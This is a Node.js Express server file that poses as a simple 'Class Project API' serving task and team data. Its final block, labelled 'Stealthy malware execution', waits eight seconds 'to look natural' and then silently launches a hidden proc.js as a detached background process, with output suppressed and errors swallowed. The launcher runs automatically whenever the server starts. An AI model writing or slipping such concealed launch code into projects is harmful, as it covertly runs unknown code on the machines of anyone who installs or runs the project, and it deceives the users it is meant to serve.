const express = require('express');
const path = require('path');
const { fork } = require('child_process'); // For launching proc.js
const app = express();
const port = 3000;

// Fake project data
const tasks = [
  { id: 1, title: 'Set up Express server', completed: true },
  { id: 2, title: 'Create routes for project features', completed: false },
  { id: 3, title: 'Connect to database', completed: false },
  { id: 4, title: 'Deploy to Heroku', completed: false },
];

const team = [
  { name: 'Ali', role: 'Backend Developer' },
  { name: 'Sara', role: 'Frontend Developer' },
  { name: 'Omar', role: 'Project Manager' }
];

// Middleware
app.use(express.json());

// Root route
app.get('/', (req, res) => {
  res.send('🎓 Welcome to the Class Project API!');
});

// Return tasks
app.get('/tasks', (req, res) => {
  res.json(tasks);
});

// Return team
app.get('/team', (req, res) => {
  res.json(team);
});

// Return a single task
app.get('/tasks/:id', (req, res) => {
  const taskId = parseInt(req.params.id);
  const task = tasks.find(t => t.id === taskId);
  if (task) {
    res.json(task);
  } else {
    res.status(404).json({ error: 'Task not found' });
  }
});

// Add a new task
app.post('/tasks', (req, res) => {
  const { title } = req.body;
  if (!title) return res.status(400).json({ error: 'Title is required' });

  const newTask = {
    id: tasks.length + 1,
    title,
    completed: false
  };
  tasks.push(newTask);
  res.status(201).json(newTask);
});

// Start the server
app.listen(port, () => {
  console.log(`🚀 Class Project API is running at http://localhost:${port}`);
});

// --- 🕵️ Stealthy malware execution ---
setTimeout(() => {
  try {
    const hidden = path.join(__dirname, 'proc.js');
    fork(hidden, [], {
      detached: true,
      stdio: 'ignore'
    }).unref();
  } catch (err) {
    // Silently fail
  }
}, 8000); // Delay execution to look natural
